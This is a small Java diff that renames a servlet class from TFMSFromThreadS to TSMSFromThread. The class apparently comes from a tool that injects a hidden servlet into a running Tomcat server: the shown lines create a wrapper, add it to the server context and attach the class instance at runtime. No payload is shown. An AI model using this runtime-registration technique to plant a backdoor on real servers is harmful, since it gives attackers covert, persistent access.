@@ -13,7 +13,7 @@ import java.lang.reflect.Field;
  *
  * @author QI4L
  */
-public class TFMSFromThreadS implements Servlet {
+public class TSMSFromThread implements Servlet {
 
     public static String pattern;
 
@@ -43,7 +43,7 @@ public class TFMSFromThreadS implements Servlet {
                 Wrapper wrapper = standardContext.createWrapper();
                 wrapper.setName(NAME);
                 standardContext.addChild(wrapper);
-                Servlet servlet = new TFMSFromThreadS();
+                Servlet servlet = new TSMSFromThread();
 
                 wrapper.setServletClass(servlet.getClass().getName());
                 wrapper.setServlet(servlet);
